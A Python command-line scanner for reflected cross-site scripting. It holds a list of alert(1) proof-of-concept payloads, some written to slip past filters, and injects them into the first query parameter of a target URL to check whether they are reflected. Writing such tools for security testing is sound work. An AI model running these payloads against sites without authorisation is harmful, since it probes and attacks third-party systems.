#!/usr/bin/env python3
"""
XSS Scanner
Usage: python xss_scanner.py https://target.com/search?q=test
"""

import sys
import requests
import urllib.parse
import re

class XSSScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        
        # XSS payloads
        self.payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            'javascript:alert(1)',
            '<a href=javascript:alert(1)>x</a>',
            '"-alert(1)-"',
            "'-alert(1)-'",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
        ]
    
    def test_payload(self, payload):
        """Test a payload"""
        try:
            parsed = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed.query)
            
            for key in params:
                params[key] = [payload]
                break
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            r = requests.get(new_url, timeout=10)
            
            # Check if payload is reflected
            if payload in r.text:
                return {'payload': payload, 'reflected': True}
            
            # Check for alert in response
            if 'alert' in r.text.lower():
                return {'payload': payload, 'alert': True}
            
        except Exception as e:
            return {'error': str(e)}
        
        return None
    
    def scan(self):
        """Scan for XSS"""
        print(f"[*] Scanning {self.url}...")
        
        for payload in self.payloads:
            result = self.test_payload(payload)
            if result and result.get('reflected'):
                print(f"[!] Possible XSS: {payload}")
                self.findings.append(result)
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python xss_scanner.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    scanner = XSSScanner(url)
    findings = scanner.scan()
    
    if findings:
        print(f"\n[!] Found {len(findings)} potential XSS")
    else:
        print("\n[*] No XSS found")


if __name__ == "__main__":
    main()